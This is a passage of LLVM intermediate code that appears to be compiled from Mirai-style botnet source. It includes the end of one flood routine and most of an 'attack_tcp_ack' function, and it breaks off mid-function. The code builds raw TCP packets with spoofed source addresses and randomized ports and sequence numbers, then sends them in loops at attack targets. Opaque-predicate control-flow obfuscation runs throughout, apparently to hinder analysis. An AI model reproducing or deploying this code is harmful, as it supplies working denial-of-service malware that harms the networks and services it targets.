  %817 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %818 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %817, i32 0, i32 6
  store i16 0, i16* %818, align 4
  %819 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %820 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %821 = bitcast %struct.tcphdr* %820 to i8*
  %822 = call zeroext i16 @htons(i16 zeroext 40) #7
  %823 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %819, i8* %821, i16 zeroext %822, i32 40)
  %824 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %825 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %824, i32 0, i32 6
  store i16 %823, i16* %825, align 4
  %826 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %827 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %826, i32 0, i32 1
  %828 = load i16, i16* %827, align 2
  %829 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %830 = load i32, i32* %17, align 4
  %831 = sext i32 %830 to i64
  %832 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %829, i64 %831
  %833 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %832, i32 0, i32 0
  %834 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %833, i32 0, i32 1
  store i16 %828, i16* %834, align 2
  %835 = load i32, i32* %18, align 4
  %836 = load i8*, i8** %38, align 8
  %837 = bitcast %union.__CONST_SOCKADDR_ARG* %41 to %struct.sockaddr**
  %838 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %839 = load i32, i32* %17, align 4
  %840 = sext i32 %839 to i64
  %841 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %838, i64 %840
  %842 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %841, i32 0, i32 0
  %843 = bitcast %struct.sockaddr_in* %842 to %struct.sockaddr*
  store %struct.sockaddr* %843, %struct.sockaddr** %837, align 8
  %844 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %41, i32 0, i32 0
  %845 = load %struct.sockaddr*, %struct.sockaddr** %844, align 8
  %846 = call i64 @sendto(i32 %835, i8* %836, i64 60, i32 16384, %struct.sockaddr* %845, i32 16)
  br label %originalBB71

originalBB75alteredBB:                            ; preds = %originalBB75, %629
  br label %originalBB75
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_ack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 17, i32 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 18, i32 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 11, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 12, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 13, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 14, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 15, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 16, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 0, i32 512)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 1, i32 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
  %105 = call i32 @attack_get_opt_ip(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 25, i32 %104)
  store i32 %105, i32* %28, align 4
  %106 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %106, i32* %10, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %109

; <label>:108:                                    ; preds = %4
  br label %584

; <label>:109:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %110 = load i32, i32* %10, align 4
  %111 = bitcast i32* %9 to i8*
  %112 = call i32 @setsockopt(i32 %110, i32 0, i32 3, i8* %111, i32 4) #6
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %114, label %133

; <label>:114:                                    ; preds = %109
  %115 = load i32, i32* @x.27
  %116 = load i32, i32* @y.28
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %114
  %123 = load i32, i32* %10, align 4
  %124 = call i32 @close(i32 %123)
  %125 = load i32, i32* @x.27
  %126 = load i32, i32* @y.28
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %584

; <label>:133:                                    ; preds = %109
  store i32 0, i32* %9, align 4
  br label %134

; <label>:134:                                    ; preds = %309, %133
  %135 = load i32, i32* %9, align 4
  %136 = load i8, i8* %5, align 1
  %137 = zext i8 %136 to i32
  %138 = icmp slt i32 %135, %137
  br i1 %138, label %139, label %312

; <label>:139:                                    ; preds = %134
  %140 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %141 = load i8**, i8*** %11, align 8
  %142 = load i32, i32* %9, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds i8*, i8** %141, i64 %143
  store i8* %140, i8** %144, align 8
  %145 = load i8**, i8*** %11, align 8
  %146 = load i32, i32* %9, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds i8*, i8** %145, i64 %147
  %149 = load i8*, i8** %148, align 8
  %150 = bitcast i8* %149 to %struct.iphdr*
  store %struct.iphdr* %150, %struct.iphdr** %29, align 8
  %151 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %152 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %151, i64 1
  %153 = bitcast %struct.iphdr* %152 to %struct.tcphdr*
  store %struct.tcphdr* %153, %struct.tcphdr** %30, align 8
  %154 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %155 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %154, i64 1
  %156 = bitcast %struct.tcphdr* %155 to i8*
  store i8* %156, i8** %31, align 8
  %157 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %158 = bitcast %struct.iphdr* %157 to i8*
  %159 = load i8, i8* %158, align 4
  %160 = and i8 %159, 15
  %161 = or i8 %160, 64
  store i8 %161, i8* %158, align 4
  %162 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %163 = bitcast %struct.iphdr* %162 to i8*
  %164 = load i8, i8* %163, align 4
  %165 = and i8 %164, -16
  %166 = or i8 %165, 5
  store i8 %166, i8* %163, align 4
  %167 = load i8, i8* %12, align 1
  %168 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 1
  store i8 %167, i8* %169, align 1
  %170 = load i32, i32* %26, align 4
  %171 = sext i32 %170 to i64
  %172 = add i64 40, %171
  %173 = trunc i64 %172 to i16
  %174 = call zeroext i16 @htons(i16 zeroext %173) #7
  %175 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 2
  store i16 %174, i16* %176, align 2
  %177 = load i16, i16* %13, align 2
  %178 = call zeroext i16 @htons(i16 zeroext %177) #7
  %179 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 3
  store i16 %178, i16* %180, align 4
  %181 = load i8, i8* %14, align 1
  %182 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 5
  store i8 %181, i8* %183, align 4
  %184 = load i8, i8* %15, align 1
  %185 = icmp ne i8 %184, 0
  br i1 %185, label %186, label %190

; <label>:186:                                    ; preds = %139
  %187 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %188 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 4
  store i16 %187, i16* %189, align 2
  br label %190

; <label>:190:                                    ; preds = %186, %139
  %191 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 6
  store i8 6, i8* %192, align 1
  %193 = load i32, i32* %28, align 4
  %194 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 8
  store i32 %193, i32* %195, align 4
  %196 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %197 = load i32, i32* %9, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %199, i32 0, i32 1
  %201 = load i32, i32* %200, align 4
  %202 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %203 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %202, i32 0, i32 9
  store i32 %201, i32* %203, align 4
  %204 = load i16, i16* %16, align 2
  %205 = call zeroext i16 @htons(i16 zeroext %204) #7
  %206 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %207 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %206, i32 0, i32 0
  store i16 %205, i16* %207, align 4
  %208 = load i16, i16* %17, align 2
  %209 = call zeroext i16 @htons(i16 zeroext %208) #7
  %210 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %211 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %210, i32 0, i32 1
  store i16 %209, i16* %211, align 2
  %212 = load i32, i32* %18, align 4
  %213 = trunc i32 %212 to i16
  %214 = call zeroext i16 @htons(i16 zeroext %213) #7
  %215 = zext i16 %214 to i32
  %216 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %217 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %216, i32 0, i32 2
  store i32 %215, i32* %217, align 4
  %218 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %219 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %218, i32 0, i32 4
  %220 = load i16, i16* %219, align 4
  %221 = and i16 %220, -241
  %222 = or i16 %221, 80
  store i16 %222, i16* %219, align 4
  %223 = load i8, i8* %20, align 1
  %224 = sext i8 %223 to i16
  %225 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %226 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %225, i32 0, i32 4
  %227 = load i16, i16* %226, align 4
  %228 = and i16 %224, 1
  %229 = shl i16 %228, 13
  %230 = and i16 %227, -8193
  %231 = or i16 %230, %229
  store i16 %231, i16* %226, align 4
  %232 = load i8, i8* %21, align 1
  %233 = sext i8 %232 to i16
  %234 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %235 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %234, i32 0, i32 4
  %236 = load i16, i16* %235, align 4
  %237 = and i16 %233, 1
  %238 = shl i16 %237, 12
  %239 = and i16 %236, -4097
  %240 = or i16 %239, %238
  store i16 %240, i16* %235, align 4
  %241 = load i8, i8* %22, align 1
  %242 = sext i8 %241 to i16
  %243 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %244 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %243, i32 0, i32 4
  %245 = load i16, i16* %244, align 4
  %246 = and i16 %242, 1
  %247 = shl i16 %246, 11
  %248 = and i16 %245, -2049
  %249 = or i16 %248, %247
  store i16 %249, i16* %244, align 4
  %250 = load i8, i8* %23, align 1
  %251 = sext i8 %250 to i16
  %252 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 4
  %254 = load i16, i16* %253, align 4
  %255 = and i16 %251, 1
  %256 = shl i16 %255, 10
  %257 = and i16 %254, -1025
  %258 = or i16 %257, %256
  store i16 %258, i16* %253, align 4
  %259 = load i8, i8* %24, align 1
  %260 = sext i8 %259 to i16
  %261 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %262 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %261, i32 0, i32 4
  %263 = load i16, i16* %262, align 4
  %264 = and i16 %260, 1
  %265 = shl i16 %264, 9
  %266 = and i16 %263, -513
  %267 = or i16 %266, %265
  store i16 %267, i16* %262, align 4
  %268 = load i8, i8* %25, align 1
  %269 = sext i8 %268 to i16
  %270 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %271 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %270, i32 0, i32 4
  %272 = load i16, i16* %271, align 4
  %273 = and i16 %269, 1
  %274 = shl i16 %273, 8
  %275 = and i16 %272, -257
  %276 = or i16 %275, %274
  store i16 %276, i16* %271, align 4
  %277 = call i32 @rand_next()
  %278 = and i32 %277, 65535
  %279 = trunc i32 %278 to i16
  %280 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %281 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %280, i32 0, i32 5
  store i16 %279, i16* %281, align 2
  %282 = load i8, i8* %22, align 1
  %283 = icmp ne i8 %282, 0
  br i1 %283, label %284, label %306

; <label>:284:                                    ; preds = %190
  %285 = load i32, i32* @x.27
  %286 = load i32, i32* @y.28
  %287 = sub i32 %285, 1
  %288 = mul i32 %285, %287
  %289 = urem i32 %288, 2
  %290 = icmp eq i32 %289, 0
  %291 = icmp slt i32 %286, 10
  %292 = or i1 %290, %291
  br i1 %292, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %284
  %293 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %294 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %293, i32 0, i32 4
  %295 = load i16, i16* %294, align 4
  %296 = and i16 %295, -2049
  %297 = or i16 %296, 2048
  store i16 %297, i16* %294, align 4
  %298 = load i32, i32* @x.27
  %299 = load i32, i32* @y.28
  %300 = sub i32 %298, 1
  %301 = mul i32 %298, %300
  %302 = urem i32 %301, 2
  %303 = icmp eq i32 %302, 0
  %304 = icmp slt i32 %299, 10
  %305 = or i1 %303, %304
  br i1 %305, label %originalBBpart26, label %originalBB1alteredBB

originalBBpart26:                                 ; preds = %originalBB1
  br label %306

; <label>:306:                                    ; preds = %originalBBpart26, %190
  %307 = load i8*, i8** %31, align 8
  %308 = load i32, i32* %26, align 4
  call void @rand_str(i8* %307, i32 %308)
  br label %309

; <label>:309:                                    ; preds = %306
  %310 = load i32, i32* %9, align 4
  %311 = add nsw i32 %310, 1
  store i32 %311, i32* %9, align 4
  br label %134

; <label>:312:                                    ; preds = %134
  br label %313

; <label>:313:                                    ; preds = %originalBBpart236, %312
  %314 = load i32, i32* @x.27
  %315 = load i32, i32* @y.28
  %316 = sub i32 %314, 1
  %317 = mul i32 %314, %316
  %318 = urem i32 %317, 2
  %319 = icmp eq i32 %318, 0
  %320 = icmp slt i32 %315, 10
  %321 = or i1 %319, %320
  br i1 %321, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %313
  store i32 0, i32* %9, align 4
  %322 = load i32, i32* @x.27
  %323 = load i32, i32* @y.28
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBBpart210, label %originalBB8alteredBB

originalBBpart210:                                ; preds = %originalBB8
  br label %330

; <label>:330:                                    ; preds = %originalBBpart232, %originalBBpart210
  %331 = load i32, i32* %9, align 4
  %332 = load i8, i8* %5, align 1
  %333 = zext i8 %332 to i32
  %334 = icmp slt i32 %331, %333
  br i1 %334, label %335, label %567

; <label>:335:                                    ; preds = %330
  %336 = load i32, i32* @x.27
  %337 = load i32, i32* @y.28
  %338 = sub i32 %336, 1
  %339 = mul i32 %336, %338
  %340 = urem i32 %339, 2
  %341 = icmp eq i32 %340, 0
  %342 = icmp slt i32 %337, 10
  %343 = or i1 %341, %342
  br i1 %343, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %335
  %344 = load i8**, i8*** %11, align 8
  %345 = load i32, i32* %9, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds i8*, i8** %344, i64 %346
  %348 = load i8*, i8** %347, align 8
  store i8* %348, i8** %32, align 8
  %349 = load i8*, i8** %32, align 8
  %350 = bitcast i8* %349 to %struct.iphdr*
  store %struct.iphdr* %350, %struct.iphdr** %33, align 8
  %351 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %352 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %351, i64 1
  %353 = bitcast %struct.iphdr* %352 to %struct.tcphdr*
  store %struct.tcphdr* %353, %struct.tcphdr** %34, align 8
  %354 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %355 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %354, i64 1
  %356 = bitcast %struct.tcphdr* %355 to i8*
  store i8* %356, i8** %35, align 8
  %357 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %358 = load i32, i32* %9, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %357, i64 %359
  %361 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %360, i32 0, i32 2
  %362 = load i8, i8* %361, align 4
  %363 = zext i8 %362 to i32
  %364 = icmp slt i32 %363, 32
  %365 = load i32, i32* @x.27
  %366 = load i32, i32* @y.28
  %367 = sub i32 %365, 1
  %368 = mul i32 %365, %367
  %369 = urem i32 %368, 2
  %370 = icmp eq i32 %369, 0
  %371 = icmp slt i32 %366, 10
  %372 = or i1 %370, %371
  br i1 %372, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  br i1 %364, label %373, label %394

; <label>:373:                                    ; preds = %originalBBpart214
  %374 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %375 = load i32, i32* %9, align 4
  %376 = sext i32 %375 to i64
  %377 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %374, i64 %376
  %378 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %377, i32 0, i32 1
  %379 = load i32, i32* %378, align 4
  %380 = call i32 @ntohl(i32 %379) #7
  %381 = call i32 @rand_next()
  %382 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %383 = load i32, i32* %9, align 4
  %384 = sext i32 %383 to i64
  %385 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %382, i64 %384
  %386 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %385, i32 0, i32 2
  %387 = load i8, i8* %386, align 4
  %388 = zext i8 %387 to i32
  %389 = lshr i32 %381, %388
  %390 = add i32 %380, %389
  %391 = call i32 @htonl(i32 %390) #7
  %392 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %393 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %392, i32 0, i32 9
  store i32 %391, i32* %393, align 4
  br label %394

; <label>:394:                                    ; preds = %373, %originalBBpart214
  %395 = load i32, i32* %28, align 4
  %396 = icmp eq i32 %395, -1
  br i1 %396, label %397, label %417

; <label>:397:                                    ; preds = %394
  %398 = load i32, i32* @x.27
  %399 = load i32, i32* @y.28
  %400 = sub i32 %398, 1
  %401 = mul i32 %398, %400
  %402 = urem i32 %401, 2
  %403 = icmp eq i32 %402, 0
  %404 = icmp slt i32 %399, 10
  %405 = or i1 %403, %404
  br i1 %405, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %397
  %406 = call i32 @rand_next()
  %407 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %408 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %407, i32 0, i32 8
  store i32 %406, i32* %408, align 4
  %409 = load i32, i32* @x.27
  %410 = load i32, i32* @y.28
  %411 = sub i32 %409, 1
  %412 = mul i32 %409, %411
  %413 = urem i32 %412, 2
  %414 = icmp eq i32 %413, 0
  %415 = icmp slt i32 %410, 10
  %416 = or i1 %414, %415
  br i1 %416, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br label %417

; <label>:417:                                    ; preds = %originalBBpart218, %394
  %418 = load i32, i32* @x.27
  %419 = load i32, i32* @y.28
  %420 = sub i32 %418, 1
  %421 = mul i32 %418, %420
  %422 = urem i32 %421, 2
  %423 = icmp eq i32 %422, 0
  %424 = icmp slt i32 %419, 10
  %425 = or i1 %423, %424
  br i1 %425, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %417
  %426 = load i16, i16* %13, align 2
  %427 = zext i16 %426 to i32
  %428 = icmp eq i32 %427, 65535
  %429 = load i32, i32* @x.27
  %430 = load i32, i32* @y.28
  %431 = sub i32 %429, 1
  %432 = mul i32 %429, %431
  %433 = urem i32 %432, 2
  %434 = icmp eq i32 %433, 0
  %435 = icmp slt i32 %430, 10
  %436 = or i1 %434, %435
  br i1 %436, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  br i1 %428, label %437, label %443

; <label>:437:                                    ; preds = %originalBBpart222
  %438 = call i32 @rand_next()
  %439 = and i32 %438, 65535
  %440 = trunc i32 %439 to i16
  %441 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %442 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %441, i32 0, i32 3
  store i16 %440, i16* %442, align 4
  br label %443

; <label>:443:                                    ; preds = %437, %originalBBpart222
  %444 = load i16, i16* %16, align 2
  %445 = zext i16 %444 to i32
  %446 = icmp eq i32 %445, 65535
  br i1 %446, label %447, label %453

; <label>:447:                                    ; preds = %443
  %448 = call i32 @rand_next()
  %449 = and i32 %448, 65535
  %450 = trunc i32 %449 to i16
  %451 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %452 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %451, i32 0, i32 0
  store i16 %450, i16* %452, align 4
  br label %453

; <label>:453:                                    ; preds = %447, %443
  %454 = load i16, i16* %17, align 2
  %455 = zext i16 %454 to i32
  %456 = icmp eq i32 %455, 65535
  br i1 %456, label %457, label %463

; <label>:457:                                    ; preds = %453
  %458 = call i32 @rand_next()
  %459 = and i32 %458, 65535
  %460 = trunc i32 %459 to i16
  %461 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %462 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %461, i32 0, i32 1
  store i16 %460, i16* %462, align 2
  br label %463

; <label>:463:                                    ; preds = %457, %453
  %464 = load i32, i32* %18, align 4
  %465 = icmp eq i32 %464, 65535
  br i1 %465, label %466, label %486

; <label>:466:                                    ; preds = %463
  %467 = load i32, i32* @x.27
  %468 = load i32, i32* @y.28
  %469 = sub i32 %467, 1
  %470 = mul i32 %467, %469
  %471 = urem i32 %470, 2
  %472 = icmp eq i32 %471, 0
  %473 = icmp slt i32 %468, 10
  %474 = or i1 %472, %473
  br i1 %474, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %466
  %475 = call i32 @rand_next()
  %476 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %477 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %476, i32 0, i32 2
  store i32 %475, i32* %477, align 4
  %478 = load i32, i32* @x.27
  %479 = load i32, i32* @y.28
  %480 = sub i32 %478, 1
  %481 = mul i32 %478, %480
  %482 = urem i32 %481, 2
  %483 = icmp eq i32 %482, 0
  %484 = icmp slt i32 %479, 10
  %485 = or i1 %483, %484
  br i1 %485, label %originalBBpart226, label %originalBB24alteredBB

originalBBpart226:                                ; preds = %originalBB24
  br label %486

; <label>:486:                                    ; preds = %originalBBpart226, %463
  %487 = load i32, i32* %19, align 4
  %488 = icmp eq i32 %487, 65535
  br i1 %488, label %489, label %493

; <label>:489:                                    ; preds = %486
